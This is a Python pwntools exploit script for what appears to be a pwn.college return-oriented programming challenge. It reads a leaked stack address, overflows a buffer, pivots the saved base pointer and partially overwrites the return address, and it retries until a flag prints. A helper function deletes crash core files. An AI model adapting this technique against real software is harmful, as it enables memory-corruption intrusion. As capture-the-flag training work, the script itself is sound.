from pwn import *
import os
import glob

def delete_core_files(directory="."):
    """
    Deletes files matching the pattern 'core.*' in the specified directory.

    Args:
        directory (str): The path to the directory to clean.
                         Defaults to the current working directory ('.').

    Returns:
        list: A list of paths to the files that were successfully deleted.
    """
    deleted_files = []
    # Construct the full path pattern for core files
    # os.path.join handles different operating system path separators
    core_file_pattern = os.path.join(directory, "core.*")

    print(f"Searching for files matching '{core_file_pattern}'...")

    # Use glob to find all files matching the pattern
    # glob.glob returns a list of paths matching the pattern
    files_to_delete = glob.glob(core_file_pattern)

    if not files_to_delete:
        print(f"No 'core.*' files found in '{directory}'.")
        return deleted_files

    print(f"Found {len(files_to_delete)} 'core.*' files to delete:")
    for file_path in files_to_delete:
        print(f"  - {file_path}")

    # Iterate through the found files and attempt to delete each one
    for file_path in files_to_delete:
        try:
            os.remove(file_path)
            print(f"Successfully deleted: {file_path}")
            deleted_files.append(file_path)
        except OSError as e:
            # Handle potential errors during deletion (e.g., permission denied, file in use)
            print(f"Error deleting {file_path}: {e}")
        except Exception as e:
            # Catch any other unexpected errors
            print(f"An unexpected error occurred while deleting {file_path}: {e}")

    print("Deletion process complete.")
    return deleted_files

while (True):
	p = process("/challenge/babyrop_level12.1", env={})

	print(p.recvuntil(b"[LEAK] Your input buffer is located at: "))

	input_addr_leak = p.recvline().split(b'.')[0] # leaked input buffer addr
	win_func_ptr = int(input_addr_leak, 16) - 0x8 # given relation that win_func_ptr is 0x8 before input_addr

	payload = b""
	payload += b"A" * 72 # buffer
	payload += p64(win_func_ptr - 0x8) # saved_rbp ( win_func_ptr - 0x8 cuz when at every "leave", rsp <- rbp + 0x8 )
	#payload += b"\xe5" + b"\x4c" # leave (rsp -> rbp + 0x8; pop rbp;)
	payload += b"\x67" + b"\x2c" + b"\x3d"

	p.send(payload)

	res = p.clean()
	if b"pwn.college" in res:
		print("[+] Flag Found!")
		print(res); exit(0)
	else:
		print("[!] Trying")

	delete_core_files()

	p.close()
